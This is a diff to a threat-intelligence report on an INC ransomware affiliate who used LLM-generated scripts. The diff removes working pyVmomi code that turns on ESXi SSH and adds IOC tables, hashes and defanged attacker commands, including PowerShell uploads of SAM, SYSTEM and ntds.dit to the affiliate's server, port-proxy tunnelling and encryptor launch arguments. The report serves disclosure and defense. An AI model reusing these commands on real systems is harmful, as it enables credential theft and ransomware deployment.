@@ -97,7 +97,7 @@ for query in (
         print(message.get("body", {}).get("content", "")[:800])
 ```
 
-Recovered spreadsheets and planning documents reference ESXi host moves, NetApp power-down tasks, remote access, backup weakness, firewalls, and SD-WAN/VPN dependencies. By the time the operator moved into WinRM and storage APIs, much of the environment had already been mapped in the victim’s own paperwork.
+Recovered spreadsheets and planning documents reference ESXi host moves, NetApp power-down tasks, remote access, backup weakness, firewalls, and SD-WAN/VPN dependencies. By the time the operator moved into WinRM and storage APIs, much of the environment had already been mapped in the victim’s documentation.
 
 After reaching an internal Windows server, another script embedded PowerShell inside a minimal Python WinRM wrapper. The original contained a real host, domain administrator credentials, and victim-specific search terms; these have been removed below.
 
@@ -221,31 +221,6 @@ requests.put(
 ```
 
 Other scripts tried to reach the same objective through VMware Guest Operations. `vc_reset.py` located the vCenter Server Appliance as a VM, tested compromised accounts for guest authentication, and prepared commands to reset both the operating-system `root` account and the SSO administrator. `vc_pwreset.py` explored session tickets, SAML authentication, VIX, and the Extension Manager, but retained comments acknowledging that several approaches could not proceed without valid guest credentials.
-
-## ESXi Remote Access
-
-The affiliate also wrote Python to connect directly to ESXi and turn on its built-in SSH service. `ehv_pyvmomi.py` enumerated host services, started `TSM-SSH` when it was stopped, and enabled any firewall ruleset whose name contained `ssh`.
-
-```python
-hosts = content.viewManager.CreateContainerView(
-    content.rootFolder,
-    [vim.HostSystem],
-    True,
-)
-
-for host in hosts.view:
-    services = host.configManager.serviceSystem
-    for service in services.serviceInfo.service:
-        if service.key == "TSM-SSH" and not service.running:
-            services.StartService(id="TSM-SSH")
-
-    firewall = host.configManager.firewallSystem
-    for ruleset in firewall.firewallInfo.ruleset:
-        if "ssh" in ruleset.key.lower() and not ruleset.enabled:
-            firewall.EnableRuleset(id=ruleset.key)
-```
-
-This would give the affiliate an additional administrative path to a hypervisor and its datastores. The recovered payload archive also contained an INC ESXi encryptor capable of stopping virtual machines and removing snapshots. However, the directory does not prove that this ESXi payload was transferred to or executed on a victim hypervisor. 
 
 # Pivoting / C2
 
@@ -372,30 +347,102 @@ These comments matter because they mirror the actual file sequence. Scripts with
 
 # Conclusion
 
-The exposed open-directory provided visibility into a successful ransomware operation from the affiliates own machine. 
-
-# Detection Opportunities
-
-High-value behaviours from this case include:
-
-* resource owner password credentials (ROPC) authentication followed by unusual Microsoft Graph mailbox, OneDrive, or SharePoint access;
-* WinRM sessions to servers that do not normally receive remote administration from the initiating account or host;
-* `ntdsutil`, volume-shadow-copy access, registry-hive export, DSInternals, or `secretsdump` activity on domain controllers;
-* new `netsh interface portproxy` entries and inbound firewall rules, especially the rule name `TunnelPorts`;
-* vCenter root-folder permissions assigning role ID `-1`, new appliance API sessions, Guest Operations against the vCenter appliance, or a snapshot named `pw-reset-temp`;
-* SSH or shell enablement on the vCenter appliance, and `TSM-SSH` service or SSH firewall-ruleset changes on ESXi;
-* storage export-policy changes that broaden client access or grant superuser permissions;
-* scheduled task `WinUpdate` launching `C:\Windows\Temp\go.bat`;
-* `C:\Windows\Temp\locker.exe` with `--mode fast --dir` arguments;
-* a burst of SMB drive mappings immediately before multiple encryptor processes start;
-* `INC-README.txt` or files carrying the INC extension appearing across mapped shares.
+The exposed directory shows an INC affiliate using LLM-generated scripts to connect stolen credentials, Active Directory compromise, vCenter/ESXi targeting, internal tunnelling, and NAS encryption. The best opportunity to stop this activity is before `locker.exe` runs: detect abnormal cloud authentication, WinRM, management-plane changes, and internal proxies.
 
 # IOCs
+
+## Network Indicators
+
+| Indicator | Role | Confidence |
+|---|---|---:|
+| `213.176.114[.]6` | Affiliate-controlled C2/staging server; open directory on TCP/8888 and confirmed HTTP PUT exfiltration receiver on TCP/7777 | High |
+| `incblog6qu4y4mm4zvw5nrmue6qbwtgjsxpw6b7ixzssu36tsajldoad[.]onion` | INC data-leak site embedded in the payloads | High |
+| `incblog[.]su` | INC clearnet leak-site address embedded in the payloads | High |
+
+## Host, Task, and Service Artefacts
+
+| Artefact | Type | Context |
+|---|---|---|
+| `C:\Windows\Temp\locker.exe` | File | Windows INC encryptor staged under the deployment name |
+| `l.exe` | File | Name of the recovered Windows INC encryptor on affiliate infrastructure |
+| `C:\Windows\Temp\go.bat` | File | Batch file used to map shares and launch the encryptor |
+| `INC-README.txt` | File | Ransom note created by the INC payload |
+| `.INC` | Extension | Encrypted-file extension/marker; validate with local telemetry |
+| `C:\Users\Public\mimi.exe` | File | Mimikatz path explicitly checked by the affiliate's credential-harvesting script |
+| `WinUpdate` | Scheduled task | Highest-privilege task used to launch `go.bat` |
+| `TunnelPorts` | Windows Firewall rule | Allowed inbound access to the affiliate's port-proxy listeners |
+| `HTTP9999` | Windows Firewall rule | Opened TCP/9999 for temporary HTTP access to staged files |
+| `TSM-SSH` | ESXi service | Started through `pyVmomi` to enable direct ESXi SSH access |
+| `pw-reset-temp` | vCenter snapshot | Snapshot name used by the attempted vCenter password-reset workflow |
+
+Recovered ransomware binary/member names included:
+
+```text
+l.exe
+locker.exe
+x86_64-pc-windows-gnu
+x86_64-unknown-linux-esxi
+x86_64-unknown-linux-gnu
+x86_64-unknown-linux-musl
+aarch64-unknown-linux-gnu
+arm-unknown-linux-gnueabi
+arm-unknown-linux-gnueabihf
+armv7-unknown-linux-gnueabi
+armv7-unknown-linux-gnueabihf
+powerpc-unknown-linux-gnu
+powerpc64-unknown-linux-gnu
+riscv64gc-unknown-linux-gnu
+s390x-unknown-linux-gnu
+sparc64-unknown-linux-gnu
+```
+
+## Command-Line and PowerShell Patterns
+
+The following patterns have been defanged and stripped of victim-specific values:
+
+```text
+C:\Windows\Temp\locker.exe --mode fast --dir <drive>:\
+
+schtasks /create /tn "WinUpdate" /tr "C:\Windows\Temp\go.bat" /sc once /st 00:00 /ru <account> /rp <password> /rl highest /f
+schtasks /run /tn "WinUpdate"
+schtasks /delete /tn "WinUpdate" /f
+
+tasklist /fi "imagename eq locker.exe"
+
+net use <drive>: \\<nas-host>\<share> /user:<account> <password>
+net use * /delete /yes
+
+netsh interface portproxy add v4tov4 listenport=<port> listenaddress=0.0.0.0 connectport=<port> connectaddress=<internal-host>
+netsh interface portproxy show all
+
+netsh advfirewall firewall add rule name="TunnelPorts" dir=in action=allow protocol=tcp localport=<ports>
+netsh advfirewall firewall add rule name="HTTP9999" dir=in action=allow protocol=tcp localport=9999
+
+Invoke-WebRequest -Uri "hxxp://213.176.114[.]6:7777/SAM" -Method PUT -InFile "C:\Windows\Temp\SAM"
+Invoke-WebRequest -Uri "hxxp://213.176.114[.]6:7777/SECURITY" -Method PUT -InFile "C:\Windows\Temp\SECURITY"
+Invoke-WebRequest -Uri "hxxp://213.176.114[.]6:7777/SYSTEM" -Method PUT -InFile "C:\Windows\Temp\SYSTEM"
+Invoke-WebRequest -Uri "hxxp://213.176.114[.]6:7777/ntds.dit" -Method PUT -InFile "C:\Windows\Temp\ntds.dit"
+```
+
+## File Hashes
 
 | Artefact | SHA-256 |
 |---|---|
 | Windows INC encryptor recovered as `l.exe` | `ef394149c8da3af730c37d550027df8639a3aaa6feaccea60112461ae6955829` |
-| Multi-platform INC payload archive | `0206a670243efa0f736e3725c4c7c8879b262cb07af47a8dcfa18bc9787cc1bd` |
+| Multi-platform INC payload archive (original name withheld) | `0206a670243efa0f736e3725c4c7c8879b262cb07af47a8dcfa18bc9787cc1bd` |
+| `aarch64-unknown-linux-gnu` | `034ac761c0a2baf754f9cc200824ab29fe7124402469d38afc3c5422567d17c8` |
+| `arm-unknown-linux-gnueabi` | `3ac3fa5f39372c2dd2822ee63f38852f6ec34a74bdbc46e34a142f8033ccb969` |
+| `arm-unknown-linux-gnueabihf` | `7dc832f876ace2d6b763f7c19f29a206dd74a5265a76dc9009fde9e8c0846656` |
+| `armv7-unknown-linux-gnueabi` | `db29c0b4d16a4f02bb1631a2eca6e589e13fb6470f20453a393604954b53562e` |
+| `armv7-unknown-linux-gnueabihf` | `b3ec3e4e7ab1cae84d9c4cdd63425318588e5d94c2dd720387842969b3bb8507` |
+| `powerpc-unknown-linux-gnu` | `5341a686d27b38b7ee580febddcd5817aeef5f94815ff291e508ecaf78cb1070` |
+| `powerpc64-unknown-linux-gnu` | `4aaa4cc22addcf3bb54c5ffa16bd2be4b0b0b0437edb29b844b496abc64b9eec` |
+| `riscv64gc-unknown-linux-gnu` | `4e83e8236ad7ef73ba0197ffe72b595c29e3ce5efd5c6c98c7663ad55e1646d0` |
+| `s390x-unknown-linux-gnu` | `e9ccbb0df3f01ed4a94f7677c802a032edfe8d23c5769522482f94016c81b507` |
+| `sparc64-unknown-linux-gnu` | `7477da223bbb0752653f32e60c05eb5c03daf3a5afe89d6565958525a274e211` |
+| `x86_64-unknown-linux-esxi` | `753207ad5e72ddc6b13889132e5de18836b1a2acf954443655fea82b430e4c99` |
+| `x86_64-unknown-linux-gnu` | `c616e11a2ce7feb3207c1808714d056c9c216f429ad6b840e781f3494ac8485d` |
+| `x86_64-unknown-linux-musl` | `126597ea3130600a83ba2ced62e70abb985fcd401ab70525650bb9a1354ca955` |
 
 # MITRE ATT&CK
 
@@ -415,4 +462,3 @@ High-value behaviours from this case include:
 | Exfiltration | T1041 | Exfiltration Over C2 Channel | Identity databases and registry hives uploaded to affiliate infrastructure |
 | Impact | T1486 | Data Encrypted for Impact | INC encryptor launched against five mapped NAS shares |
 | Impact | T1490 / T1489 | Inhibit System Recovery / Service Stop | Capabilities present in the recovered INC payload |
-
